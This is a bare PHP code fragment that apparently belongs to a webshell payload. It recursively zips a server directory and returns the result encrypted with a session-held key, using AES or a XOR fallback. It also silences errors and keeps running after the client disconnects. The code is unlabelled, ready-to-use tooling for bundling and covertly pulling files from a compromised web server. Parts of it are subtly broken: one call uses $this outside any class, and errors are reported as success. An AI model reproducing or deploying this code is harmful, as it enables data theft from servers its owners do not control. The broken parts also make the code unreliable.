@error_reporting(0);

function main($sourceDirPath, $zipFilePath, $excludeExt, $mode) {
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);
    $result = array();
    try {
        if ($mode === 'compress') {
            $ext = explode('|', $excludeExt);
            $relationArr = array(
                $sourceDirPath => array(
                    'originName' => $sourceDirPath,
                    'is_dir' => true,
                    'children' => array()
                )
            );
            modifiyFileName($sourceDirPath, $relationArr[$sourceDirPath]['children']);
            $key = array_keys($relationArr);
            $val = array_values($relationArr);
            $zip = new \ZipArchive;
            $zip->open($zipFilePath,\ZipArchive::CREATE);
            zipDir($key[0], '', $zip, $val[0]['children'], $ext);
            $zip->close();
            $result["msg"] = base64_encode($zipFilePath);
        }
        $result["status"] = base64_encode("success");
    } catch (Exception $e){
        $result["status"] = base64_encode("success");
        $result["msg"] = base64_encode($e->getMessage());
    }
    echo encrypt(json_encode($result),  $_SESSION['k']);
}

function zipDir($real_path, $zip_path, &$zip, $relationArr, $ext)
{
    $sub_zip_path = empty($zip_path) ? '' : $zip_path . '/';
    if (is_dir($real_path)) {
        foreach ($relationArr as $k => $v) {
            if ($v['is_dir']) {
                $zip->addEmptyDir($sub_zip_path . $v['originName']);
                zipDir($real_path . '/' . $k, $sub_zip_path . $v['originName'], $zip, $v['children'], $ext);
            } else {
                if(!in_array(pathinfo($k, PATHINFO_EXTENSION), $ext)) {
                    $zip->addFile($real_path . '/' . $k, $sub_zip_path . $k);
                }
            }
        }
    }
}

function modifiyFileName($path, &$relationArr){
    if (!is_dir($path) || !is_array($relationArr)) {
        return false;
    }
    if ($dh = opendir($path)) {
        $count = 0;
        while (($file = readdir($dh)) !== false) {
            if(in_array($file,array('.', '..', null))) continue;
            if (is_dir($path . '/' . $file)) {
                $relationArr[$file] = array(
                'originName' => iconv('GBK', 'UTF-8', $file),
                'is_dir' => true,
                'children' => array()
                );
                $this->modifiyFileName($path . '/' . $file, $relationArr[$file]['children']);
            }else{
                $relationArr[$file] = array(
                'originName' => iconv('GBK', 'UTF-8', $file),
                'is_dir' => false,
                'children' => array()
                );
            }
        }
    }
}

function encrypt($data,$key)
{
	if(!extension_loaded('openssl'))
    	{
    		for($i=0;$i<strlen($data);$i++) {
    			 $data[$i] = $data[$i]^$key[$i+1&15];
    			}
			return $data;
    	}
    else
    	{
    		return openssl_encrypt($data, "AES128", $key);
    	}
}